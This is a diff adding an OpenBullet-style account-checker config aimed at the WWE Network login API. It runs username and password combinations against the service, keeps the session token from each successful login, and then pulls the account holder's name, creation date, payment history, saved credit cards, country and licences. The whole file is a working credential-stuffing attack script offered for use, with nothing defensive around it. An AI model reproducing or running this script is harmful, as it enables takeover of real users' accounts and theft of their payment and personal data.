@@ -1,0 +1,144 @@
+[SETTINGS]
+{
+  "Name": "WWE",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-15T13:29:13.9336699+01:00",
+  "AdditionalInfo": "",
+  "Author": "Seliax#2983",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#POST REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/signin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+
+#TICKCHECK KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "failedAuthenticatio" 
+  KEYCHAIN Success OR 
+    KEY "{\"authorisationToken\":\"" 
+
+#TOKEN PARSE "<SOURCE>" LR "{\"authorisationToken\":\"" "\"," -> VAR "TK" 
+
+#PROFILE REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+  HEADER "Authorization: Bearer <TK>" 
+
+PARSE "<SOURCE>" LR "{\"name\":{\"fullName\":\"" "\"" -> CAP "Full Name" 
+
+PARSE "<SOURCE>" LR "\"createdDate\":" "}" -> VAR "CR" 
+
+FUNCTION UnixTimeToDate "<CR>" -> CAP "CreatedDate" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/customer/history/payment" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+  HEADER "Authorization: Bearer <TK>" 
+
+PARSE "<SOURCE>" LR "\"historyItems\":[" "]," Recursive=TRUE -> CAP "Payements" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/customer/cards" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+  HEADER "Authorization: Bearer <TK>" 
+
+PARSE "<SOURCE>" LR "{\"cards\":[" "]" Recursive=TRUE -> CAP "CreditCards" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/address" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+  HEADER "Authorization: Bearer <TK>" 
+
+PARSE "<SOURCE>" LR "[{\"countryCode\":\"" "\"" -> CAP "CountryCode" 
+
+REQUEST GET "https://dce-frontoffice.imggaming.com/api/v2/user/licence" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "x-api-key: cca51ea0-7837-40df-a055-75eb6347b2e7" 
+  HEADER "Authorization: Bearer <TK>" 
+
+PARSE "<SOURCE>" LR "[" "]" Recursive=TRUE -> CAP "UserLicences" 
+
